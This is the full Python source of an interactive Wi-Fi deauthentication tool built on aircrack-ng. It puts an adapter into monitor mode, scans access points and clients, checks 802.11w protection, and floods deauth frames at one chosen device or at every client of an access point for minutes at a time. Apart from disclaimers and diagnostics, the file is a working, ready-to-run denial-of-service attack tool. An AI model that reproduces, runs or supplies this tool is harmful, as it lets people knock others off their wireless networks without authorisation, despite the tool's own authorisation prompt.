#!/usr/bin/env python3
"""
mainframe — a focused 802.11 deauthentication utility.

Wraps the aircrack-ng suite (airodump-ng / aireplay-ng) behind an interactive,
single-purpose workflow: pick one adapter, isolate it, scan, target, deauth,
restore. Only the chosen interface is ever touched; every other adapter stays
online for the entire session.

This build also *diagnoses* before it fires: it reads each AP's security and
802.11w (PMF) status, groups virtual BSSIDs that belong to the same physical
router, flags hidden SSIDs, and runs an injection self-test. Deauth cannot
defeat a PMF-protected client — that is by design — so the tool now tells you
that up front instead of letting you wonder why nothing dropped.

For use only on networks you own or are explicitly authorised to test.

Author : The Priest
License: MIT
"""

from __future__ import annotations

import argparse
import atexit
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path

__version__ = "1.3.0"

# ─── palette ──────────────────────────────────────────────────────────────────
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
M = "\033[95m"; W = "\033[97m"; B = "\033[1m"; D = "\033[2m"; X = "\033[0m"

BANNER = rf"""{G}{B}
  __  __  ___ ___ _  _ ___ ___    _   __  __ ___
 |  \/  |/ _ \_ _| \| | __| _ \  /_\ |  \/  | __|
 | |\/| | (_) | || .` | _||   / / _ \| |\/| | _|
 |_|  |_|\___/___|_|\_|_| |_|_\/_/ \_\_|  |_|___|
{X}{D} v{__version__}  ·  isolates one adapter, leaves the rest online{X}
"""

OUI_PATHS = (
    "/var/lib/ieee-data/oui.txt",
    "/usr/share/ieee-data/oui.txt",
    "/usr/share/aircrack-ng/airodump-ng-oui.txt",
)
MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")

# per-process scratch dir for airodump output (created lazily, removed at exit)
_SCANDIR: Path | None = None


def scan_dir() -> Path:
    global _SCANDIR
    if _SCANDIR is None:
        _SCANDIR = Path(tempfile.mkdtemp(prefix="mainframe-"))
        atexit.register(_cleanup_scan_dir)
    return _SCANDIR


def _cleanup_scan_dir() -> None:
    if _SCANDIR and _SCANDIR.exists():
        shutil.rmtree(_SCANDIR, ignore_errors=True)


# ─── data models ──────────────────────────────────────────────────────────────
@dataclass
class Interface:
    name: str
    mode: str = "?"
    driver: str = "?"
    is_default_route: bool = False


@dataclass
class AccessPoint:
    bssid: str
    channel: str
    power: str
    essid: str
    security: str = "?"      # OPEN / WEP / WPA / WPA2 / WPA3 / ?
    pmf: str = "?"           # none / cap / req / ?  (802.11w management-frame protection)
    hidden: bool = False

    @property
    def band(self) -> str:
        return band_of(self.channel)

    @property
    def deauthable(self) -> str:
        """How a classic deauth is expected to fare against this AP's clients."""
        if self.pmf == "req":
            return "no"      # every client must use PMF; deauth is dropped
        if self.pmf == "cap":
            return "maybe"   # per-client: PMF-capable clients drop it, legacy ones don't
        if self.pmf == "none":
            return "yes"     # no PMF negotiated; classic deauth works
        return "?"


@dataclass
class Client:
    mac: str
    power: str
    bssid: str


@dataclass
class Session:
    interface: str | None = None
    monitor_active: bool = False
    targets: list[str] = field(default_factory=list)


# ─── shell plumbing ───────────────────────────────────────────────────────────
def run(cmd: list[str], capture: bool = True) -> tuple[int, str]:
    """Run a command, never raising. Returns (returncode, stdout)."""
    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE if capture else subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return proc.returncode, (proc.stdout or b"").decode(errors="ignore")
    except FileNotFoundError:
        return 127, ""


def run_timed(cmd: list[str], seconds: int) -> str:
    """Run a command for up to `seconds`, then stop it. Return whatever it printed."""
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT)
    except FileNotFoundError:
        return ""
    try:
        out, _ = proc.communicate(timeout=seconds)
    except subprocess.TimeoutExpired:
        proc.send_signal(signal.SIGINT)
        try:
            out, _ = proc.communicate(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
    return (out or b"").decode(errors="ignore")


def have(tool: str) -> bool:
    return shutil.which(tool) is not None


def die(msg: str, code: int = 1):
    print(f"{R}error:{X} {msg}")
    sys.exit(code)


def require_root() -> None:
    if os.geteuid() != 0:
        die("needs root. run with sudo, or launch via the desktop entry (pkexec).")


def require_tools() -> None:
    missing = [t for t in ("airodump-ng", "aireplay-ng", "iw", "ip", "nmcli")
               if not have(t)]
    if missing:
        print(f"{R}missing required tools:{X} {', '.join(missing)}")
        print(f"{D}  apt install aircrack-ng iw iproute2 network-manager{X}")
        sys.exit(1)


# ─── power helpers ────────────────────────────────────────────────────────────
def power_int(raw: str) -> int | None:
    """Return signal in dBm, or None if unknown. airodump uses -1 for 'unmeasured'."""
    try:
        v = int(raw)
    except (TypeError, ValueError):
        return None
    if v >= 0 or v == -1:   # 0/-1/positive = no valid measurement
        return None
    return v


# ─── OUI / vendor lookup ──────────────────────────────────────────────────────
_OUI: dict[str, str] | None = None


def _load_oui() -> dict[str, str]:
    global _OUI
    if _OUI is not None:
        return _OUI
    _OUI = {}
    pat = re.compile(r"^([0-9A-Fa-f]{6})\s+\(base 16\)\s+(.+?)\s*$")
    for path in OUI_PATHS:
        p = Path(path)
        if not p.exists():
            continue
        try:
            with p.open(errors="ignore") as fh:
                for line in fh:
                    m = pat.match(line)
                    if m:
                        _OUI[m.group(1).upper()] = m.group(2)
        except OSError:
            continue
        if _OUI:
            break
    return _OUI


def vendor(mac: str) -> str:
    table = _load_oui()
    if not table:
        return ""
    return table.get(mac.upper().replace(":", "")[:6], "")


# ─── physical-AP grouping ─────────────────────────────────────────────────────
def same_ap_key(bssid: str) -> str:
    """
    Heuristic key that clusters virtual BSSIDs belonging to one physical router.

    Multi-SSID routers derive each virtual AP's BSSID from a single base MAC by
    tweaking a couple of bytes (commonly one octet). They almost always keep the
    OUI (first three octets) and the final two octets identical, varying only a
    middle octet. We key on first-three + last-two and ignore the 4th octet.

    This is a heuristic, not a guarantee — it's only used for display grouping.
    """
    parts = bssid.upper().split(":")
    if len(parts) != 6:
        return bssid.upper()
    return ":".join(parts[0:3] + parts[4:6])


# ─── presentation ─────────────────────────────────────────────────────────────
def clear():
    print("\033[2J\033[H", end="")


def header(text: str):
    pad = max(2, 44 - len(text))
    print(f"\n{C}{B}━━ {text} {'━' * pad}{X}")


def bars(raw: str) -> str:
    p = power_int(raw)
    if p is None:
        return f"{D}··· ?{X}"
    if p >= -50: return f"{G}▇▅▃▁{X}"
    if p >= -60: return f"{G}·▅▃▁{X}"
    if p >= -70: return f"{Y}··▃▁{X}"
    if p >= -80: return f"{Y}···▁{X}"
    return f"{R}····{X}"


def power_label(raw: str) -> str:
    p = power_int(raw)
    return f"{p} dBm" if p is not None else "signal n/a"


def pmf_tag(ap: AccessPoint) -> str:
    """Short coloured tag describing security + whether deauth can land."""
    sec = ap.security if ap.security not in ("?", "") else "sec?"
    if ap.pmf == "req":
        return f"{R}{sec} · PMF required → deauth blocked{X}"
    if ap.pmf == "cap":
        return f"{Y}{sec} · PMF optional → deauth hit-or-miss{X}"
    if ap.pmf == "none":
        return f"{G}{sec} · no PMF → deauth works{X}"
    return f"{D}{sec} · PMF unknown{X}"


# 5 GHz channels that require DFS (radar avoidance). On most cards these are
# not usable for injection in monitor mode without the radio having cleared
# radar first — deauth will silently fail. Non-DFS 5 GHz is 36/40/44/48 (and,
# outside the EU, 149–165). If a target sits on a DFS channel, move your own
# router to 36–48 to test.
DFS_CHANNELS = {52, 56, 60, 64, 100, 104, 108, 112, 116,
                120, 124, 128, 132, 136, 140, 144}


def band_of(channel: str) -> str:
    try:
        c = int(channel)
    except (TypeError, ValueError):
        return "?"
    if 1 <= c <= 14:
        return "2.4"
    if c >= 36:
        return "5"
    return "?"


def is_dfs(channel: str) -> bool:
    try:
        return int(channel) in DFS_CHANNELS
    except (TypeError, ValueError):
        return False


def band_color(band: str) -> str:
    return {"2.4": G, "5": C}.get(band, D)


def prompt(text: str) -> str:
    try:
        return input(f"{G}{text}{X}").strip()
    except EOFError:
        return ""


# ─── interface discovery ──────────────────────────────────────────────────────
def discover_interfaces() -> list[Interface]:
    rc, out = run(["iw", "dev"])
    if rc != 0:
        return []

    interfaces: list[Interface] = []
    cur: Interface | None = None
    for line in out.splitlines():
        m = re.match(r"\s*Interface (\S+)", line)
        if m:
            if cur:
                interfaces.append(cur)
            cur = Interface(name=m.group(1))
        elif cur:
            mm = re.search(r"\btype (\S+)", line)
            if mm:
                cur.mode = mm.group(1)
    if cur:
        interfaces.append(cur)

    _, route = run(["ip", "route", "show", "default"])
    default_iface = None
    m = re.search(r"\bdev (\S+)", route)
    if m:
        default_iface = m.group(1)

    for iface in interfaces:
        iface.is_default_route = (iface.name == default_iface)
        try:
            iface.driver = Path(
                f"/sys/class/net/{iface.name}/device/driver"
            ).resolve().name
        except OSError:
            pass
    return interfaces


def select_interface(preselect: str | None, assume_yes: bool) -> Interface:
    interfaces = discover_interfaces()
    if not interfaces:
        die("no wireless interfaces found. is your adapter plugged in?")

    if preselect:
        chosen = next((i for i in interfaces if i.name == preselect), None)
        if chosen is None:
            die(f"interface '{preselect}' not found")
    else:
        # Never offer the adapter carrying your internet, unless it's all you have.
        candidates = [i for i in interfaces if not i.is_default_route] or interfaces

        header("wireless adapters")
        for idx, iface in enumerate(candidates):
            tags = []
            if iface.is_default_route:
                tags.append(f"{R}carries your internet{X}")
            if any(d in iface.driver for d in ("ath9k", "rtl", "mt76", "rt2800")):
                tags.append(f"{G}injection-capable likely{X}")
            tagstr = "   " + "  ".join(tags) if tags else ""
            print(f"  {G}[{idx}]{X} {B}{iface.name:<8}{X} {D}{iface.driver}{X}{tagstr}")

        if len(candidates) == 1:
            chosen = candidates[0]
            print(f"\n{D}auto-selecting {chosen.name} (sole candidate){X}")
        else:
            while True:
                sel = prompt("\nadapter> ")
                try:
                    chosen = candidates[int(sel)]
                    break
                except (ValueError, IndexError):
                    print(f"{R}invalid selection{X}")

    if chosen.is_default_route and not assume_yes:
        print(f"{R}warning:{X} {chosen.name} is currently carrying your internet.")
        print(f"{D}using it will drop your connection until the session ends.{X}")
        if prompt("use it anyway? [y/N] ").lower() != "y":
            die("cancelled.")
    return chosen


# ─── security / PMF probe (managed-mode iw scan, before we go monitor) ─────────
def scan_security(iface: str) -> dict[str, AccessPoint]:
    """
    Do a normal `iw scan` while the adapter is still managed, and read each AP's
    security suite + 802.11w (PMF) status from the RSN information element.

    Returns {BSSID_UPPER: AccessPoint} carrying security / pmf / essid / channel.
    Best-effort: on any failure we return what we have (possibly empty) and the
    UI simply shows 'unknown' for the missing fields.
    """
    run(["ip", "link", "set", iface, "up"], capture=False)
    text = ""
    for _ in range(2):                       # NM may be mid-scan; one quick retry
        rc, text = run(["iw", "dev", iface, "scan"])
        if rc == 0 and "BSS " in text:
            break
        time.sleep(1)
    return parse_iw_scan(text)


def parse_iw_scan(text: str) -> dict[str, AccessPoint]:
    aps: dict[str, AccessPoint] = {}
    cur: AccessPoint | None = None
    in_rsn = False

    def finish(ap: AccessPoint | None):
        if ap is not None:
            aps[ap.bssid.upper()] = ap

    for raw in text.splitlines():
        m = re.match(r"^BSS ([0-9a-fA-F:]{17})", raw)
        if m:
            finish(cur)
            cur = AccessPoint(bssid=m.group(1).upper(), channel="?", power="",
                              essid="<hidden>", security="OPEN", pmf="none",
                              hidden=True)
            in_rsn = False
            continue
        if cur is None:
            continue

        if re.match(r"^\s+RSN:", raw):
            in_rsn = True
        elif re.match(r"^\s+WPA:", raw):
            in_rsn = False
            if cur.security == "OPEN":
                cur.security = "WPA"

        mf = re.search(r"\bfreq:\s*(\d+)", raw)
        if mf:
            cur.channel = freq_to_channel(mf.group(1))

        ms = re.search(r"\bSSID:\s*(.*)$", raw)
        if ms:
            name = ms.group(1).strip()
            if name:
                cur.essid = name
                cur.hidden = False

        # authentication suite tells us WPA2 vs WPA3 (SAE) — and SAE ⇒ PMF required
        if "Authentication suites:" in raw or re.search(r"\*\s*(SAE|PSK|FT)", raw):
            if "SAE" in raw:
                cur.security = "WPA3"
                cur.pmf = "req"
            elif "PSK" in raw and cur.security in ("OPEN", "WPA"):
                cur.security = "WPA2"

        # explicit RSN capability words (modern iw decodes these for us)
        if in_rsn or "MFP" in raw:
            if "MFP-required" in raw:
                cur.pmf = "req"
            elif "MFP-capable" in raw and cur.pmf != "req":
                cur.pmf = "cap"

        # fall back to the raw RSN capabilities hex if the words aren't printed:
        #   bit 6 (0x40) = MFP required, bit 7 (0x80) = MFP capable
        if in_rsn:
            mc = re.search(r"Capabilities:.*\(0x([0-9a-fA-F]{2,4})\)", raw)
            if mc:
                val = int(mc.group(1), 16)
                if val & 0x40:
                    cur.pmf = "req"
                elif (val & 0x80) and cur.pmf != "req":
                    cur.pmf = "cap"

    finish(cur)
    return aps


def freq_to_channel(freq: str) -> str:
    try:
        f = int(freq)
    except (TypeError, ValueError):
        return "?"
    if f == 2484:
        return "14"
    if 2412 <= f <= 2472:
        return str((f - 2407) // 5)
    if 5000 <= f <= 5900:
        return str((f - 5000) // 5)
    if 5955 <= f <= 7115:                    # 6 GHz, just in case
        return str((f - 5950) // 5)
    return "?"


def merge_security(aps: list[AccessPoint], sec: dict[str, AccessPoint]) -> None:
    """Fold the iw-scan security map onto the airodump-discovered APs (by BSSID)."""
    for ap in aps:
        info = sec.get(ap.bssid.upper())
        if not info:
            continue
        ap.security = info.security
        ap.pmf = info.pmf
        # airodump shows nothing for cloaked SSIDs; iw may have caught the name
        if (ap.essid in ("", "<hidden>")) and info.essid not in ("", "<hidden>"):
            ap.essid = info.essid
        if ap.essid in ("", "<hidden>"):
            ap.hidden = True


# ─── monitor mode (surgical, verified) ────────────────────────────────────────
def enter_monitor(iface: Interface, session: Session) -> str:
    name = iface.name
    print(f"\n{D}isolating {name} from NetworkManager (other adapters untouched)…{X}")
    run(["nmcli", "device", "set", name, "managed", "no"], capture=False)

    # Stop only a wpa_supplicant bound to THIS interface (word-boundary safe).
    _, ps = run(["pgrep", "-af", "wpa_supplicant"])
    iface_flag = re.compile(rf"-i\s*{re.escape(name)}\b")
    for line in ps.splitlines():
        if iface_flag.search(line):
            pid = line.split(maxsplit=1)[0]
            run(["kill", pid], capture=False)

    run(["ip", "link", "set", name, "down"], capture=False)
    rc, _ = run(["iw", "dev", name, "set", "type", "monitor"])
    run(["ip", "link", "set", name, "up"], capture=False)

    if rc != 0 or not _is_monitor(name):
        run(["nmcli", "device", "set", name, "managed", "yes"], capture=False)
        die(f"{name} would not enter monitor mode — does this adapter support it?")

    session.interface = name
    session.monitor_active = True
    print(f"{G}✓ {name} is in monitor mode.{X}")
    return name


def _is_monitor(name: str) -> bool:
    rc, out = run(["iw", "dev", name, "info"])
    return rc == 0 and "type monitor" in out


def exit_monitor(session: Session) -> None:
    if not session.monitor_active or not session.interface:
        return
    name = session.interface
    print(f"\n{D}restoring {name} to managed mode…{X}")
    run(["ip", "link", "set", name, "down"], capture=False)
    run(["iw", "dev", name, "set", "type", "managed"], capture=False)
    run(["ip", "link", "set", name, "up"], capture=False)
    run(["nmcli", "device", "set", name, "managed", "yes"], capture=False)
    session.monitor_active = False
    print(f"{G}✓ {name} restored and managed by NetworkManager again.{X}")


def set_channel(name: str, channel: str) -> bool:
    rc, _ = run(["iw", "dev", name, "set", "channel", str(channel)])
    return rc == 0


def injection_test(mon: str, ap: AccessPoint) -> None:
    """
    aireplay-ng -9 (injection test) against the target AP. Separates 'my card
    can't inject' from 'the frames go out but the client ignores them' — the
    latter is what PMF looks like.
    """
    print(f"\n{D}testing injection on {mon} (ch {ap.channel})…{X}")
    out = run_timed(["aireplay-ng", "--test", "--ignore-negative-one",
                     "-a", ap.bssid, mon], seconds=8)

    works = "Injection is working" in out
    m = re.search(r"(\d+)\s*/\s*(\d+):", out)        # e.g. "27/30: 90%"
    ratio = (int(m.group(1)), int(m.group(2))) if m else None

    if works:
        print(f"{G}✓ card injection works.{X}")
    else:
        print(f"{R}✗ injection test did not confirm — driver/monitor problem "
              f"likely (mt76x2u can be flaky).{X}")
    if ratio:
        got, sent = ratio
        if got == 0:
            print(f"{Y}  AP acked 0/{sent} of our frames: frames leave the card but "
                  f"nothing comes back. Distance, wrong channel, or the AP isn't "
                  f"answering injected probes.{X}")
        else:
            print(f"{D}  AP acked {got}/{sent} injected frames.{X}")


# ─── scanning ─────────────────────────────────────────────────────────────────
def scan(mon: str, seconds: int, channel: str | None = None,
         bands: str | None = None,
         label: str = "scanning") -> tuple[list[AccessPoint], list[Client]]:
    sd = scan_dir()
    for f in sd.glob("scan*"):
        try:
            f.unlink()
        except OSError:
            pass
    prefix = str(sd / "scan")

    cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv",
           "--write-interval", "1"]
    if channel:
        cmd += ["--channel", str(channel)]
    elif bands:
        cmd += ["--band", bands]
    cmd.append(mon)

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print()
    try:
        for left in range(seconds, 0, -1):
            print(f"  {C}{label}{X} {D}· {left:>3}s left · ctrl-c to stop early{X}",
                  end="\r", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print()
    finally:
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=4)
        except subprocess.TimeoutExpired:
            proc.kill()
    print(" " * 64, end="\r")

    csv = Path(f"{prefix}-01.csv")
    if not csv.exists():
        return [], []
    return _parse_csv(csv.read_text(errors="ignore"))


def _parse_csv(raw: str) -> tuple[list[AccessPoint], list[Client]]:
    # airodump CSV: AP table, blank line, station table.
    sections = re.split(r"\r?\n\s*\r?\n", raw, maxsplit=1)
    aps: list[AccessPoint] = []
    clients: list[Client] = []

    if sections:
        for line in sections[0].splitlines()[1:]:
            # Split only the 13 fixed leading fields; the remainder is
            # "ESSID[,...], Key". ESSID can contain commas, so we keep the raw
            # remainder and peel the final Key field off the end.
            parts = line.split(",", 13)
            if len(parts) < 14 or not MAC_RE.match(parts[0].strip()):
                continue
            essid = parts[13].rsplit(",", 1)[0].strip()
            hidden = (essid == "")
            aps.append(AccessPoint(
                bssid=parts[0].strip(),
                channel=parts[3].strip(),
                power=parts[8].strip(),
                essid=essid or "<hidden>",
                hidden=hidden,
            ))

    if len(sections) > 1:
        for line in sections[1].splitlines()[1:]:
            cells = [c.strip() for c in line.split(",")]
            if len(cells) < 6 or not MAC_RE.match(cells[0]):
                continue
            clients.append(Client(mac=cells[0], power=cells[3], bssid=cells[5]))

    return aps, clients


# ─── selection ────────────────────────────────────────────────────────────────
def _signal_key(raw: str) -> int:
    """Sort key: strongest first, unknown signal last."""
    p = power_int(raw)
    return -p if p is not None else 10_000


def select_ap(aps: list[AccessPoint], band_filter: str) -> AccessPoint | None:
    if band_filter in ("2.4", "5"):
        aps = [a for a in aps if a.band == band_filter]

    if not aps:
        print(f"{R}no access points found.{X} {D}try a longer scan: -s 30{X}")
        if band_filter != "all":
            print(f"{D}(scanning {band_filter} GHz only — drop --band to see everything){X}")
        return None

    # Cluster virtual BSSIDs of one physical router together, strongest router
    # first, then by band, then signal — so the two halves of a dual-band SSID
    # sit next to each other instead of scattered across the list.
    def router_best(key: str) -> int:
        return min((_signal_key(a.power) for a in aps if same_ap_key(a.bssid) == key),
                   default=10_000)

    aps = sorted(
        aps,
        key=lambda a: (router_best(same_ap_key(a.bssid)), same_ap_key(a.bssid),
                       a.band, _signal_key(a.power)),
    )

    # essid -> set of bands, so we can annotate "also on 5 GHz"
    bands_for: dict[str, set[str]] = {}
    for a in aps:
        if not a.hidden:
            bands_for.setdefault(a.essid, set()).add(a.band)

    scope = {"2.4": "2.4 GHz", "5": "5 GHz", "all": "all bands"}[band_filter]
    header(f"access points · {scope}")

    prev_key = None
    for idx, ap in enumerate(aps):
        key = same_ap_key(ap.bssid)
        if prev_key is not None and key != prev_key:
            print(f"  {D}{'·' * 50}{X}")          # divider between physical routers
        prev_key = key

        bc = band_color(ap.band)
        dfs = f"  {Y}DFS{X}" if is_dfs(ap.channel) else ""

        name = ap.essid
        extra = []
        if ap.hidden:
            named = next((a.essid for a in aps
                          if same_ap_key(a.bssid) == key and not a.hidden), None)
            extra.append(f"{D}same router as '{named}'{X}" if named
                         else f"{D}cloaked SSID{X}")
        else:
            others = bands_for.get(ap.essid, set()) - {ap.band}
            if others:
                extra.append(f"{D}also on {'/'.join(sorted(others))} GHz{X}")
        extrastr = f"   {' · '.join(extra)}" if extra else ""

        print(f"  {G}[{idx:>2}]{X} {B}{name[:32]}{X}{extrastr}")
        print(f"       {D}{ap.bssid}{X}  ch {ap.channel:>3}  "
              f"{bc}{ap.band:>3} GHz{X}{dfs}  {bars(ap.power)} "
              f"{D}{power_label(ap.power)}{X}")
        print(f"       {pmf_tag(ap)}")

    print(f"\n{D}PMF = 802.11w. 'required' means clients cryptographically reject "
          f"spoofed deauths — no tool gets past it.{X}")

    while True:
        sel = prompt("\ntarget AP (number, q to quit)> ").lower()
        if sel in ("q", "quit", ""):
            return None
        try:
            ap = aps[int(sel)]
        except (ValueError, IndexError):
            print(f"{R}invalid selection{X}")
            continue
        if ap.pmf == "req":
            print(f"{R}heads up:{X} {ap.essid} enforces PMF (802.11w). A deauth will "
                  f"be ignored by every client on it. This is the standard working "
                  f"as designed, not a tool fault.")
            if prompt("pick it anyway (e.g. to confirm the block)? [y/N] ").lower() != "y":
                continue
        if is_dfs(ap.channel):
            print(f"{Y}note:{X} ch {ap.channel} is a DFS channel. Most cards refuse "
                  f"injection here in monitor mode, so the deauth may not land.")
            print(f"{D}if it fails, move your router to channel 36–48 and rescan.{X}")
            if prompt("continue anyway? [y/N] ").lower() != "y":
                continue
        return ap


def select_client(clients: list[Client], ap: AccessPoint):
    matching = [c for c in clients if c.bssid.lower() == ap.bssid.lower()]
    matching.sort(key=lambda c: _signal_key(c.power))

    header(f"clients on {ap.essid}")
    if not matching:
        print(f"  {D}none seen yet — devices only appear while transmitting{X}")
    else:
        for idx, c in enumerate(matching):
            v = vendor(c.mac)
            vstr = f"  {C}{v}{X}" if v else ""
            rnd = ""
            # locally-administered 2nd-hex-nibble (2,6,A,E) ⇒ randomised MAC
            if len(c.mac) >= 2 and c.mac[1].upper() in "26AE":
                rnd = f"  {D}(randomised MAC){X}"
            print(f"  {G}[{idx:>2}]{X} {B}{c.mac}{X}  {bars(c.power)}{vstr}{rnd}")

    print(f"\n  {G}[a]{X}  {Y}all clients{X} — broadcast deauth (everyone on this AP)")
    print(f"  {G}[r]{X}  rescan (the device may not have surfaced yet)")
    print(f"  {G}[q]{X}  cancel")

    while True:
        sel = prompt("\nselect> ").lower()
        if sel == "q":
            return "cancel"
        if sel == "r":
            return "rescan"
        if sel == "a":
            return None
        try:
            return matching[int(sel)].mac
        except (ValueError, IndexError):
            print(f"{R}invalid selection{X}")


# ─── deauth ───────────────────────────────────────────────────────────────────
def confirm(ap: AccessPoint, client_mac: str | None, minutes: int) -> bool:
    header("confirm")
    print(f"  AP        : {B}{ap.essid}{X}  {D}{ap.bssid}{X}")
    dfs = f"  {Y}· DFS (injection may not work){X}" if is_dfs(ap.channel) else ""
    print(f"  channel   : {ap.channel}  ({ap.band} GHz){dfs}")
    print(f"  security  : {pmf_tag(ap)}")
    if client_mac:
        v = vendor(client_mac)
        print(f"  target    : {B}{client_mac}{X}" + (f"  {C}{v}{X}" if v else ""))
    else:
        print(f"  target    : {Y}ALL CLIENTS (broadcast){X}")
    print(f"  duration  : {minutes} min")

    if ap.deauthable == "no":
        print(f"\n{R}expected result: nothing drops. PMF is required here.{X}")
    elif ap.deauthable == "maybe":
        print(f"\n{Y}expected result: legacy clients may drop; any PMF-capable "
              f"client (most modern phones) will not.{X}")

    return prompt(f"\n{R}{B}proceed? [y/N] {X}").lower() == "y"


def deauth(mon: str, ap: AccessPoint, client_mac: str | None, minutes: int) -> None:
    if not set_channel(mon, ap.channel):
        print(f"{Y}warning: couldn't lock channel {ap.channel}; continuing anyway{X}")
        if is_dfs(ap.channel):
            print(f"{D}  ch {ap.channel} is DFS — the card likely won't TX here. "
                  f"move the router to 36–48 and retry.{X}")

    injection_test(mon, ap)

    if ap.pmf == "req":
        print(f"\n{R}{B}note:{X} this AP requires PMF. The frames below will be sent, "
              f"but compliant clients will ignore every one of them. If a device "
              f"here actually drops, it wasn't using PMF.")

    cmd = ["aireplay-ng", "--deauth", "0", "--ignore-negative-one", "-a", ap.bssid]
    if client_mac:
        cmd += ["-c", client_mac]
    cmd.append(mon)

    end = time.time() + minutes * 60
    target = client_mac or "all clients"
    print(f"\n{R}{B}» deauth active against {target} — ctrl-c to stop early{X}")

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while time.time() < end:
            if proc.poll() is not None:
                print(f"\n{Y}aireplay-ng exited early (rc={proc.returncode}). "
                      f"channel/driver issue?{X}")
                break
            left = int(end - time.time())
            mm, ss = divmod(left, 60)
            print(f"  {R}●{X} running · {B}{mm:02d}:{ss:02d}{X} remaining   ",
                  end="\r", flush=True)
            time.sleep(1)
        print()
    except KeyboardInterrupt:
        print(f"\n{Y}stopped early{X}")
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=4)
            except subprocess.TimeoutExpired:
                proc.kill()
    print(f"{G}✓ deauth finished.{X}")


# ─── CLI ──────────────────────────────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="mainframe",
        description="Focused 802.11 deauthentication utility (your own networks only).",
    )
    p.add_argument("-i", "--iface", help="adapter to use (skips the picker)")
    p.add_argument("-s", "--scan-time", type=int, default=20,
                   help="AP scan duration, seconds (default 20)")
    p.add_argument("-c", "--client-scan-time", type=int, default=30,
                   help="focused client scan duration, seconds (default 30)")
    p.add_argument("-t", "--time", type=int, default=10,
                   help="deauth duration, minutes (default 10)")
    p.add_argument("-b", "--band", choices=["2.4", "5", "all"], default="all",
                   help="band to scan: 2.4, 5, or all (default all)")
    p.add_argument("-y", "--yes", action="store_true",
                   help="skip the authorisation acknowledgement prompt")
    p.add_argument("-l", "--list", action="store_true",
                   help="list wireless adapters and exit")
    p.add_argument("--no-secscan", action="store_true",
                   help="skip the managed-mode security/PMF probe")
    p.add_argument("-V", "--version", action="version",
                   version=f"mainframe {__version__}")
    return p


def validate_args(args) -> None:
    if args.scan_time < 1:
        die("--scan-time must be >= 1")
    if args.client_scan_time < 1:
        die("--client-scan-time must be >= 1")
    if args.time < 1:
        die("--time must be >= 1 minute")


def list_and_exit():
    for iface in discover_interfaces():
        flag = f" {R}(internet){X}" if iface.is_default_route else ""
        print(f"{iface.name:<10} {iface.mode:<10} {iface.driver}{flag}")
    sys.exit(0)


def acknowledge(skip: bool) -> None:
    if skip:
        return
    print(f"{Y}This tool disrupts Wi-Fi. Use it only on networks you own or are{X}")
    print(f"{Y}authorised to test. You are responsible for how you use it.{X}")
    if prompt("type 'yes' to confirm you're authorised> ").lower() != "yes":
        die("not acknowledged; exiting.")


# ─── orchestration ────────────────────────────────────────────────────────────
def main() -> None:
    args = build_parser().parse_args()
    validate_args(args)

    require_root()
    require_tools()

    if args.list:
        list_and_exit()

    clear()
    print(BANNER)
    acknowledge(args.yes)

    session = Session()
    iface = select_interface(args.iface, args.yes)

    # Read security + PMF while the adapter is still in managed mode. This is the
    # bit that tells us, before any deauth, whether a target can even be kicked.
    sec_map: dict[str, AccessPoint] = {}
    if not args.no_secscan:
        print(f"\n{D}reading security/PMF info on {iface.name} (managed scan)…{X}")
        sec_map = scan_security(iface.name)
        if sec_map:
            print(f"{G}✓ read {len(sec_map)} AP(s).{X}")
        else:
            print(f"{Y}security scan returned nothing; PMF will show as unknown.{X}")

    try:
        mon = enter_monitor(iface, session)

        airo_band = {"2.4": "bg", "5": "a", "all": "abg"}[args.band]
        aps, _ = scan(mon, args.scan_time, bands=airo_band,
                      label="scanning for access points")
        merge_security(aps, sec_map)
        ap = select_ap(aps, args.band)
        if ap is None:
            return

        while True:
            _, clients = scan(mon, args.client_scan_time, channel=ap.channel,
                              label=f"scanning clients on channel {ap.channel}")
            choice = select_client(clients, ap)
            if choice == "cancel":
                return
            if choice == "rescan":
                continue
            client_mac = choice
            break

        if not confirm(ap, client_mac, args.time):
            print(f"{D}aborted by user{X}")
            return

        session.targets.append(client_mac or f"broadcast@{ap.bssid}")
        deauth(mon, ap, client_mac, args.time)

    finally:
        exit_monitor(session)
        if session.targets:
            print(f"\n{D}session summary: {len(session.targets)} target(s) — "
                  f"{', '.join(session.targets)}{X}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}interrupted{X}")
        sys.exit(130)
